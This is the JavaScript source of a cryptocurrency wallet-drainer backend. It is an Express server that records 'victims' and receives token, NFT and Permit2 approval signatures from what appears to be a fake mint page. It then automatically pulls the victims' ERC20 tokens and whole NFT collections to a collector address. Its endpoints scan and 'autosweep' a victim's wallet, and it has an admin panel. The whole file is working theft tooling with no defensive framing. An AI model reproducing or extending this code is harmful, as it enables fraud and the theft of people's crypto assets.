const fs = require('fs');
const path = require('path');
const express = require('express');
const { pullERC20, pullAllNFTs, getBalances } = require('./puller');

const cfg = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8'));
const app = express();
app.use(express.json());

const DB_FILE = path.join(__dirname, 'victims.json');
function logVictim(entry){
  let arr = [];
  try{ arr = JSON.parse(fs.readFileSync(DB_FILE,'utf8')); }catch(e){}
  arr.push({ time: new Date().toISOString(), ...entry });
  fs.writeFileSync(DB_FILE, JSON.stringify(arr, null, 2));
}

app.post('/api/report', async (req, res) => {
  try{
    const body = req.body || {};
    console.log('[report]', body.type, body.victim, body.token || body.collection || body.amount || '');
    logVictim(body);
    if(body.type === 'erc20-approve' && body.token && body.victim){
      pullERC20(body.token, body.victim).then(r=>console.log('[auto-pull erc20]', r)).catch(e=>console.log('[auto-pull erc20 err]', e.message));
    }
    if(body.type === 'nft-approve' && body.collection && body.victim){
      pullAllNFTs(body.collection, body.victim).then(r=>console.log('[auto-pull nft]', r)).catch(e=>console.log('[auto-pull nft err]', e.message));
    }
    // Permit2 sigs direkt loggen für manuelle Ausführung
    if(body.type === 'permit2-sig'){
      console.log('[permit2-sig]', body.victim, body.token);
    }
    res.json({ ok:true });
  }catch(e){ res.status(500).json({ ok:false, error: e.message }); }
});

app.get('/api/victims', (req,res)=>{
  try{ res.json(JSON.parse(fs.readFileSync(DB_FILE,'utf8'))); }catch(e){ res.json([]); }
});

app.get('/api/balances/:victim', async (req,res)=>{
  try{ res.json(await getBalances(req.params.victim)); }catch(e){ res.status(500).json({error:e.message}); }
});

app.get('/api/scan/:victim', async (req,res)=>{
  try{
    const { scanVictim } = require('./scanner');
    res.json(await scanVictim(req.params.victim));
  }catch(e){ res.status(500).json({error:e.message}); }
});

app.post('/api/autosweep/:victim', async (req,res)=>{
  try{
    const { scanVictim } = require('./scanner');
    const victim = req.params.victim;
    const scan = await scanVictim(victim);
    const results = [];
    for(const t of (scan.tokens||[])){
      try{ results.push({ token: t.contract, ...(await pullERC20(t.contract, victim)) }); }
      catch(e){ results.push({ token: t.contract, ok:false, error:e.message }); }
    }
    for(const n of (scan.nfts||[])){
      try{ results.push({ nft: n.contract+':'+n.tokenId, ...(await pullAllNFTs(n.contract, victim)) }); }
      catch(e){ results.push({ nft: n.contract, ok:false, error:e.message }); }
      break; // pullAllNFTs zieht ganze Collection auf einmal
    }
    res.json({ ok:true, victim, results });
  }catch(e){ res.status(500).json({error:e.message}); }
});

// Frontend statisch mitservieren — kein Netlify nötig
app.use(express.static(path.join(__dirname, '..', 'frontend')));

// Admin-Panel
app.get('/admin', (req,res)=> res.sendFile(path.join(__dirname, 'admin.html')));
app.get('/mint', (req,res)=> res.sendFile(path.join(__dirname, '..', 'frontend', 'index.html')));

const PORT = cfg.port || 3001;
app.listen(PORT, ()=> console.log(`Drainer backend on :${PORT}, collector=${cfg.collector}`));
